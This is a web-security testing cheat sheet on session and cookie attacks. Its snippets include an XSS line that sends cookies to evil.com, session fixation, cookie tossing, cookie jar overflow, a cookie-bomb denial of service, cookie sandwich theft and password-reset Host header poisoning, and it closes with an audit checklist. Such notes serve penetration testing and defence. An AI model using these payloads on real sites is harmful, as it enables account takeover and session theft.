---
tags:
  - high
  - logic
---

# Session & Cookie Security

## TL;DR

Session vulnerabilities enable account takeover through cookie manipulation, session fixation, and weak token generation.

```
# Quick checks
Set-Cookie: session=xxx (no HttpOnly, Secure, SameSite?)
Pre-login session persists post-login?
Token = base64(user_id:timestamp)?
```

---

## Cookie Flags

```http
Set-Cookie: session=abc123; 
  HttpOnly;          # Blocks JS access (XSS protection)
  Secure;            # HTTPS only
  SameSite=Strict;   # CSRF protection
  Path=/;            # Scope
  Domain=.target.com # Domain scope
```

**Test HttpOnly:**
```javascript
document.cookie  // If visible, HttpOnly missing
```

---

## Exploitation

### 1. Session Fixation

```
1. Attacker visits site → session: ABC123
2. Attacker sends: https://target.com/?session=ABC123
3. Victim logs in with fixed session
4. Attacker uses ABC123 → Access victim's account
```

**Cookie injection via subdomain:**
```javascript
// From xss.target.com
document.cookie = "session=ATTACKER; domain=.target.com; path=/";
```

### 2. Session Hijacking

**Via XSS:**
```javascript
new Image().src = 'https://evil.com/?c=' + document.cookie;
```

**Via Referer leak:**
```html
<!-- Token in URL leaks via Referer -->
<a href="https://evil.com">Click</a>
```

### 3. Cookie Manipulation

**Decode and modify:**
```bash
# Base64 cookie
echo 'dXNlcjphZG1pbg==' | base64 -d
# user:admin

# Modify and re-encode
echo -n 'user:superadmin' | base64
```

### 4. Cookie Tossing

**Subdomain override:**
```javascript
// From attacker.target.com
document.cookie = "session=EVIL; domain=.target.com; path=/";
// Overrides session on target.com
```

**Path specificity:**
```javascript
document.cookie = "session=EVIL; path=/admin";
// Takes priority for /admin
```

### 5. Cookie Prefix Bypass

**Bypass __Host- prefix:**
```javascript
// Unicode whitespace smuggling
document.cookie = `${String.fromCodePoint(0x2000)}__Host-session=evil`;
```

### 6. Cookie Jar Overflow

**Force oldest cookies out:**
```javascript
// Create 700+ cookies to overflow jar
for(let i=0; i<700; i++) {
  document.cookie = `overflow${i}=x`;
}
// HttpOnly session may be evicted
document.cookie = "session=ATTACKER";
```

### 7. Cookie Bomb (DoS)

```javascript
// 4KB cookie causes 400 Bad Request
document.cookie = "bomb=" + "A".repeat(4000);
// Victim can't access site
```

### 8. Cookie Sandwich (Steal HttpOnly)

```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;  // Open quote
// HttpOnly cookie gets trapped
document.cookie = `param2=end";`;   // Close quote
// Reflected in response → steal value
```

### 9. Session State Issues

**Old sessions persist:**
```
1. Login → session A
2. Logout
3. Login → session B
4. Session A still valid!
```

**No session binding:**
```
Session not bound to IP/User-Agent
Stolen session works from anywhere
```

### 10. CSRF Token Issues

**Token in cookie only (insecure):**
```
Token only in cookie, not form
Request sent with cookies automatically
```

**Predictable tokens:**
```
CSRF = MD5(session_id)
CSRF = timestamp + user_id
```

---

## Bypasses

### HttpOnly Bypass

```
# TRACE method reflection (if enabled)
# PHP info page reflects cookies
# Error pages dumping cookies
```

### SameSite Bypass

```html
<!-- SameSite=Lax allows top-level GET -->
<a href="https://target.com/action">Click</a>

<!-- Subdomain of same site -->
<!-- evil.target.com can access target.com cookies -->
```

### Secure Flag Bypass

```
# Test HTTP endpoint if exists
# Subdomain on HTTP can read non-Secure cookies
```

---

## Password Reset Token Security

### Host Header Poisoning

```http
POST /forgot-password HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

email=victim@target.com
```

Reset email contains: `https://evil.com/reset?token=abc`

### Token Leakage via Referer

```
1. Reset link: https://target.com/reset?token=SECRET
2. Page loads external resources
3. Token leaked in Referer header
```

### Weak Token Generation

```
# Predictable patterns
token=1612345678000  (timestamp)
token=base64(user_id + timestamp)
token=md5(email)
```

### Token Reuse

```
1. Use reset token
2. Try same token again → Still works?
```

---

## Checklist

- [ ] Check HttpOnly flag
- [ ] Check Secure flag
- [ ] Check SameSite attribute
- [ ] Test session regeneration on login
- [ ] Check if logout invalidates session server-side
- [ ] Test session fixation
- [ ] Analyze token entropy
- [ ] Check cookie tossing from subdomains
- [ ] Test cookie prefix enforcement
- [ ] Look for sensitive data in cookie values
- [ ] Test multiple concurrent sessions
- [ ] Check session timeout
- [ ] Test CSRF token validation
- [ ] Test password reset token security

---

## Tools

- **Caido** — Cookie editor and analysis
- **EditThisCookie** — Browser extension
- **Browser DevTools** — Application → Cookies
